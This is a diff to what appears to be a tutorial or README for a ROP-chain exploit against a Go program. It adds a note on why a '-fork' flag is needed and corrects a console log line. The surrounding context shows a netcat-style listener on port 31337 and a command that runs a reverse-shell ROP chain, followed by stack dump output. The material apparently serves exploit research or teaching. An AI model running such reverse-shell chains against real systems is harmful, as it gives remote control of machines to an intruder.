@@ -107,9 +107,14 @@ listening on [any] 31337 ...
 
 #### 5. Run the ROP chain
 
+Note: We use `-fork` here because the Go program will crash without it.
+We *think* the garbage collector interferes with our ROP chain, so we
+disable it by forking to a single-threaded process (meaning no other
+threads can interfere with our payload's execution).
+
 ```console
 $ ./build/runner-injected -fork build/reverse-shell-chain.bin
-$ 2024/08/25 10:55:09 pc: 0x4a89d7 | pc line: 81 | main: 0x4a87c0 | uncalled: 0x4a8fc0
+2024/08/25 10:55:09 pc: 0x4a89d7 | pc line: 81 | main: 0x4a87c0 | uncalled: 0x4a8fc0
 0xc000093578: 0x4142434445464748
 0xc000093580: 0x4a89d7
 0xc000093588: 0x51
